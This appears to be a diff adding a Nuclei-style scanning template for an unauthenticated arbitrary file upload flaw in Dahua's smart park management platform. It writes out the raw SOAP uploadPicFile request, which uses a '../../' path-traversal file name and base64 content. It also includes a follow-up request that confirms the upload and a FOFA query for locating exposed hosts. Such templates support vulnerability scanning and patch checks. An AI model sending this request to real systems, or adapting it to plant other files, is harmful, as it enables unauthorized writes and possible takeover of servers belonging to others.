@@ -1,0 +1,49 @@
+id: dahua-wpms-gis-soap-poi-fileuplod
+
+info:
+  name: 大华智慧园区/emap/webservice/gis/soap/poi soapUI前台未授权任意文件上传
+  author: xy
+  severity: high
+  description: 大华智慧园区/emap/webservice/gis/soap/poi soapUI前台未授权任意文件上传
+  reference:
+    - https://
+  tags: dahua,wpms,fileuplod
+  metadata:
+    veified: true
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /emap/webservice/gis/soap/poi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Content-Type: text/xml;charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Accept: */*
+        Content-Length: 461
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <res:uploadPicFile>
+                <!--type: string-->
+                <arg0>/../../{{randstr}}.txt</arg0>
+                <!--type: base64Binary-->
+                <arg1>{{base64("{{randstr}}")}}</arg1>
+              </res:uploadPicFile>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+      - |
+        GET /upload/{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), '<code>1</code>')"
+          - "status_code_2 == 200 && contains((body_2), '{{randstr}}')"
+        condition: and
+# 上传内容需要base64编码，上传后的目录: /upload/xxxxxx.txt
